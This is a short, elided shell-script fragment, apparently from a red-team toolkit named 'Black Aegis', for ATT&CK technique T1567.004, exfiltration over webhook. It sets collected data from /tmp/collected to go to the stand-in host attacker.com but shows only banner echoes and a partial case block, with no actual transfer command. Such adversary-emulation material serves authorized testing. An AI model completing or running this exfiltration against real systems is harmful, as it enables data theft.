...
# Technique: T1567.004 - Exfiltration Over Webhook (T1567.004)
# WARNING: Authorized testing only.

DATA="${1:-/tmp/collected}"
SERVER="${2:-attacker.com}"

echo "[*] Black Aegis - T1567.004 Exfiltration"
echo "[*] Data: $DATA"
echo "[*] Server: $SERVER"
...
case "T1567.004" in
    ...
    T1567.001)
        ...
        ;;
    *)
        echo "[+] Exfiltration via Exfiltration Over Webhook (T1567.004)"
